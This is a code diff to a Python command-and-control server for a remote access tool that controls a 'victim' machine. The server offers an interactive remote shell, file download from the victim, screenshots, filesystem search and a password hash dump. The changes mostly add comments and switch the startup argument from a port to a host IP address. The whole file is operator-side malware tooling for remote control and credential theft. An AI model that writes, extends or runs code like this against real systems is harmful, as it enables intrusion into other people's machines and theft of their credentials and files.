@@ -2,6 +2,7 @@
 from secure_socket import Server
 from sys import argv
 import os
+import ipaddress
 
 def help():
   print("""
@@ -45,14 +46,16 @@ def hashdump(victim):
 
 def shell(victim):
   victim.send('shell')
-  ps1=victim.receive()
-  cmd=input(ps1)
+  prompt=victim.receive()
+  cmd=input(prompt)
   while cmd!='exit':
     victim.send(cmd)
     prompt_out=victim.receive()
+    # * is separator between prompt and output
     out="*".join(prompt_out.split('*')[1:])
     prompt=prompt_out.split('*')[0]
     if out!='':
+      # dont print too much \n
       if out[-1]=="\n":
         print(out[:-1])
       else:
@@ -74,6 +77,7 @@ def download(victim):
   victim.send('download')
   filename_src=input('file to get => ')
   filename_dst=input('new name => ')
+  # knowing * char is not allowed in filenames, it can be used as separator.
   victim.send(f"{filename_src}*{filename_dst}")
   ret=victim.receive()
   print(ret)
@@ -94,6 +98,7 @@ def run_command(server, cmd):
     case 'ipconfig':
       ipconfig(server)
     case 'screenshot':
+      # remove spaces when user puts too many
       check = cmd.split(" ")
       while '' in check:
         check.remove('')
@@ -102,12 +107,13 @@ def run_command(server, cmd):
       else:
         filename = check[1]
       screenshot(server,filename)
-    case  'clear':
+    case 'clear':
       clear()
     case 'cls':
       clear()
     case 'search':
       check = cmd.split(" ")
+      # if user just inputs a filename:
       if len(check) ==2 and not "" in check:
         name = check[1]
         if os.name =='nt':
@@ -115,6 +121,7 @@ def run_command(server, cmd):
         else:
           path= "/"
         search(server,name,path)
+      # if user also specifies a path where to search:
       elif len(check) ==3 and not "" in check :
         path = check[1]
         name = check[2]
@@ -123,23 +130,25 @@ def run_command(server, cmd):
         print("search file [path] Find the location of a file in a directory, defaults to root directory.")
     case 'hashdump':
       hashdump(server)
-    case '':
+    case '':# if user hits enter mistakenly
       pass
     case 'exit':
       return False
-    case _:
+    case _: # else print unknown
       print(f"Unknown command : {command}")
   return True
 
 if __name__ == "__main__":
+  host="127.0.0.1"
   try:
-    port=int(argv[1])
-    if port<1025 or port>65535:
-      port=62832
+    # verify ip is valid
+    ipaddress.ip_address(argv[1])
+    host=argv[1]
   except:
-    port=62832
+    print("The IP adress is not valid.")
+    exit(1)
     
-  server=Server(run_command, port=port)
+  server=Server(run_command, host=host)
   try:
     server.run()
   except KeyboardInterrupt:
